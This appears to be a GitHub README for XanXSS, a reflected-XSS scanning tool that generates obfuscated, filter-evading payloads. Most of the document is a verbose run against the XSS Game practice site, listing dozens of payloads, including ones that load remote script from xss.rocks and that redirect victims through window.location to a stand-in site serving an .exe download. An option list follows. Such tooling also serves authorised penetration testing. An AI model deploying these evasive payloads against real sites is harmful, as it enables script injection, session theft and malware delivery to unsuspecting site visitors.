# XanXSS

XanXSS is a reflected XSS searching tool (DOM coming soon) that creates payloads based from templates. Unlike other XSS scanners that just run through a list of payloads. XanXSS tries to make the payload unidentifiable, for example: 

```bash
<xAnXSS</TitLE></STYLE><SVG/ONload='alERt(1);'/></XaNxSs</titLe></StYlE><SvG/ONlOAD='alerT(1);'/>
<ifrAmE&#13;Src=&#160;[2].Find(CoNfirm);=&#160;"JAVaScRIpT:proMpT(1))"javAscrIpt:/*--></scRIPt>
/>cLIcK&#13;Me!</b</TextaRea></TiTLE><BUTtON ONcLIck='aleRT(1);'/>XaNxss</TEXTaRea>
<iMG&#13;sRc=%0acONfIRM();=+'jAVASCRiPT:alerT("XSS");'</STYlE><Svg/onLoad='alErT((1));'/>
```

With XanXSS every payload is different. XanXSS works by running through the payloads until a specified number is found or a timer hits the max time, this prevents it from looping for to long.

# Proof of Concept

For this proof of concept we will use https://xss-game.appspot.com/level1/frame

```bash
admin@TBG-a0216:~/bin/python/xanxss$ python xanxss.py -u "http://xss-game.appspot.com/level1/frame?query=" -a 12 -t 12 -f 25 -v 

    ____  ___             ____  ___  _________ _________
    \   \/  /____    ____ \   \/  / /   _____//   _____/
     \     /\__  \  /    \ \     /  \_____  \ \_____  \ 
     /     \ / __ \|   |  \/     \  /        \/        \
    /___/\  (____  /___|  /___/\  \/_______  /_______  /
          \_/    \/     \/      \_/        \/        \/ 
Twitter->   @stay__salty
Github -->  ekultek         
Version---> v(0.1)


[info][16:37:34] using default payloads
[info][16:37:34] generating payloads
[info][16:37:34] running payloads through tampering procedures
[info][16:37:34] payloads tampered successfully
[info][16:37:34] running payloads
[debug][16:37:34] running payload '<xanxsSjAvasCRipT:/*--></SCripT></xanXsS</Style><svG/Onload='ALERt((1);'/>'
[debug][16:37:34] running payload '<SCRipt&#13;Src=+(pRomPt))``;=%09'HtTP://xsS.ROCKs/xss.jS'jaVAsCRIpt:/*--></ScrIPt></Script</tiTLe></stYLe><Svg/OnLOaD='aLeRT(1);'/>'
[debug][16:37:34] running payload '<xanxssjAvASCRIpT:/*--></ScRiPt></XANxsS</tiTle></STyle><SvG/OnLOAD\u006c='aLErt(1);'/>'
[debug][16:37:34] running payload '<iMG/+/sRc=%0dA=%0DPrOMpt,a(();=%0a'JaVaSCripT:aLeRt("XSS"));'javasCRiPT:/*--></sCRipt>'
[debug][16:37:34] running payload '<SCRIPT/*/srC=&#34;&#62;A=%0aprompT,A(();=%09'htTp://xSs.rockS/XSs.Js'</TeXTARea></TiTLE><buTTOn oncLiCK='ALeRT(1);'/>XAnXsS</tEXTARea></scrIPTjaVaSCRipT:/*--></sCRIPt>'
[debug][16:37:35] running payload '<IMg&#160;SRC=%09CONFIRM(());=%0a'JavAscrIpt:aLERt("XSS");'JavasCrIpT:/*--></SCripT>'
[debug][16:37:35] running payload '<XAnXSS</STYlE><SVg/OnLOAd='aLeRT(1));'/></xAnXsSjaVasCRIpt:/*--></scrIpt>'
[debug][16:37:35] running payload '<sCRIPt`Src=+cOnFiRm());=+'htTP://xSs.rOCKs/xsS.js'</TextaREA></tiTle><ButTon ONCliCK='AlErt(1);'/>xanxSS</TeXTarEa></SCriPtJAvaScrIPt:/*--></SCrIpt>'
[debug][16:37:35] running payload '<scRIpT</title></stYle><sVG/onlOAD='AlERT(1));'/>aLert((1));</scRipT</titLE></STyLe><sVG/oNlOad='aLeRt((1));'/>'
[debug][16:37:35] running payload '<SC\u009lripT/*/SrC=%0aConFirm();=&#160;'hTTP://xsS.ROcks/xSs.js'</TITle></StYlE><svg/ONLOad='ALerT(1);'/></ScriPT</StyLe><svG/OnLOAd='ALert((1);'/>'
[debug][16:37:35] running payload '<B//ONMOuSEOver=&#34;&#62;ConFIrm(();=&#160;wIndow.LoCATIoN=&#160\u005g;(pRoMPT))``;=%0A'htTpS://MyBaDSitE.cOM/dOwnLoAd.phP?iTem=+(pRomPt)``;=%0apuMPEDuPkICKs.exE'jaVAScrIpt:/*--></sCrIPt>ClIcK/*/mE!</b</tiTLe></sTyLE><sVG/OnLoAd='aLert(1));'/>'
[debug][16:37:35] running payload '<IfRA\u007pme%00SrC=%0AcOnFIRm(());=%0a"jaVAScriPT:pRoMPT(1)"jAVaScRIpt:/*--></SCriPt>'
[debug][16:37:36] running payload '<IframE//SrC=&#34;&#62;CONfIRM());=%0d"jAvAscriPT:pROMpT(1)"</TeXtarEa></TiTLe><BUttoN oNcliCK='aLERt((1));'/>XanXss</texTAReA>'
[debug][16:37:36] running payload '<iMG/+/SRc=%09[3].FInd(COnFIRm));=&#34;&#62;'javAscriPt:A\u004pLerT("XSS");'JavaSCriPt:/*--></sCripT>'
[debug][16:37:36] running payload '<imG&#160;SRc=%0d[2].FinD(cOnFiRm));=&#160;'JaVaScRipt:ALERt("XSS"));'</styLe><SVg/oNLoad='ALErT(1));'/>'
[debug][16:37:36] running payload '<script</tITLE></style><SVG/onLOAD='alerT(1);'/>AleRt(1);</ScRIpTjAvASCrIPT:/*--></scRIPt>'
[debug][16:37:36] running payload '<XaNxSs</tITle></sTYlE><SVg/ONload='aLERT((1);'/></xANxsS</stYLE><Svg/OnlOAD='AleRt(1);'/>'
[debug][16:37:36] running payload '<b//ONmOUSEoVEr=%0D[8].fInd(coNfIrM);=%09WinDoW.location=%0A(COnfiRm)(();=&#160;'htTPS://MYBadsite.cOM/DoWNlOaD.php?ITEm=+COnFIrM();=+puMPEDupKickS.ExE'</styLe><sVG/OnLOAd='alERt((1);'/>CLick%00Me!</b</sTYlE><SVG/onloAD='AlERt(1);'/>'
[debug][16:37:37] running payload '<scriPT</styLE><SvG/ONloaD='aLERT(1);'/>ALeRt(1);</SCrIPt</tiTLe></STYlE><sVG/OnloAd='aLeRT(1\u009x);'/>'
[debug][16:37:37] running payload '<iFRamE%00srC=&#34;&#62;[7].FInD(cOnFiRm);=%0A"javAsCRipT:prompt(1))"</tITlE\u009e></sTyle><svg/oNLOad='alert((1);'/>'
[debug][16:37:37] running payload '<b/*/OnmOusEOver=&#160;A=%0apROMpt,A();=+wINdOW.LOCAtIon=&#34;&#62;co\U006EfiR\u006\u003id();=%09'HTtPS://MYBAdsiTE.com/doWNload.php?itEm=+((CoNfIrm)();=&#34;&#62;puMpedUPKickS.eXe'</teXtaREa></tiTLe><BUTTON oNclIck='aLeRT((1);'/>XanXsS</texTAREA>cLICk/*/Me!</B</StylE><SVG/ONloAd='aLERt((1));'/>'
[debug][16:37:37] running payload '<XANxSSJaVaScRIpt:/*--></SCripT></XAnXSs</TExtAREa></tITle\u008w><b\u009fuTTON oNclIck='Ale\u003rRT((1);'/>xANXss</TEXTArEA>'
[debug][16:37:37] running payload '<SCript/*/sRC=+A=&#160;prOmpt,A();=&#160;'HtTp://XsS.rocKS/xsS.JS'</stylE><sVG/onLoad='AlErT((1);'/></SCriptjAvaScriPt:/*--></ScrIpt>'
[debug][16:37:37] running payload '<ImG&#13;SRc=&#34;&#62;Co\U006efIr\u006D();=%0a\u007u'javAsCript:AlerT(("XSS");'</titlE></StYLe><svg/onloAD='alERt(1);'/>'
[debug][16:37:38] running payload '<B/*/ONmouSeOvEr=%0Aa=&#160;prOmpT,A();=%09WIndOw.LOCAtION=%0Aa=%09prompt,a();=%0A'hTTps://MYBadsITe.COM/DOWNLOAD.PHp?ITeM=&#160;cO\u006Efir\u006D());=%0dPumPeduPkicks.EXE'</tITlE></StyLE><svg/OnlOAD='aLerT((1));'/>clIcK&#13;mE!</bJavASCript:/*--></sCrIPT>'
[warning][16:37:48] times up dumping found
[info][16:37:48] working payloads:
--------------------------------------------------
  ~~> <xanxssjAvASCRIpT:/*--></ScRiPt></XANxsS</tiTle></STyle><SvG/OnLOAD\u006c='aLErt(1);'/>
  ~~> <SCRipt&#13;Src=+(pRomPt))``;=%09'HtTP://xsS.ROCKs/xss.jS'jaVAsCRIpt:/*--></ScrIPt></Script</tiTLe></stYLe><Svg/OnLOaD='aLeRT(1);'/>
  ~~> <xanxsSjAvasCRipT:/*--></SCripT></xanXsS</Style><svG/Onload='ALERt((1);'/>
--------------------------------------------------
[info][16:37:48] found a total of 3 working payloads
admin@TBG-a0216:~/bin/python/xanxss$ 
```

Now lets check those scripts in the HTML of the website:

Payload:```<xanxssjAvASCRIpT:/*--></ScRiPt></XANxsS</tiTle></STyle><SvG/OnLOAD\u006c='aLErt(1);'/>```
![xanxsspoc1](https://user-images.githubusercontent.com/14183473/48165682-f1dede00-e2ab-11e8-8c33-4cd8d909b760.png)

Payload: ```<SCRipt&#13;Src=+(pRomPt))``;=%09'HtTP://xsS.ROCKs/xss.jS'jaVAsCRIpt:/*--></ScrIPt></Script</tiTLe></stYLe><Svg/OnLOaD='aLeRT(1);'/>```
![xanxsspoc2](https://user-images.githubusercontent.com/14183473/48165747-25216d00-e2ac-11e8-8d2f-8f6eed88f7b8.png)

Payload: ```<xanxsSjAvasCRipT:/*--></SCripT></xanXsS</Style><svG/Onload='ALERt((1);'/>```
![xanxsspoc3](https://user-images.githubusercontent.com/14183473/48165767-38343d00-e2ac-11e8-8785-aa736183ab9d.png)


# Options

XanXSS comes complete with the ability to use a proxy, is compatible with proxychains, and allows you to add custom headers. I have provideda full list of options for your convience:

```bash
usage: xanxss.py [-h] [-u http://test.com/test.php?id=] [-a VERIFY]
                 [-f AMOUNT] [-t TIME]
                 [-p SCRIPT,SCRIPT,SCRIPT [SCRIPT,SCRIPT,SCRIPT ...]]
                 [-F FILE-PATH] [-v] [--proxy TYPE://IP:PORT]
                 [-H HEADER=VALUE,HEADER:VALUE]

optional arguments:
  -h, --help            show this help message and exit
  -u http://test.com/test.php?id=, --url http://test.com/test.php?id=
                        pass a URL to test for XSS vulnerabilities
  -a VERIFY, --amount VERIFY
                        how many verifications steps to be taken
  -f AMOUNT, --find AMOUNT
                        find this amount of working payloads
  -t TIME, --time TIME  amount of time in seconds to spend on testing
  -p SCRIPT,SCRIPT,SCRIPT [SCRIPT,SCRIPT,SCRIPT ...], --payloads SCRIPT,SCRIPT,SCRIPT [SCRIPT,SCRIPT,SCRIPT ...]
                        pass a comma separated list of your own payloads
  -F FILE-PATH, --file FILE-PATH
                        pass a file containing payloads
  -v, --verbose         run in verbose mode
  --proxy TYPE://IP:PORT
                        pass a proxy in the format type://ip:port
  -H HEADER=VALUE,HEADER:VALUE, --headers HEADER=VALUE,HEADER:VALUE
                        Add your own custom headers to the request
```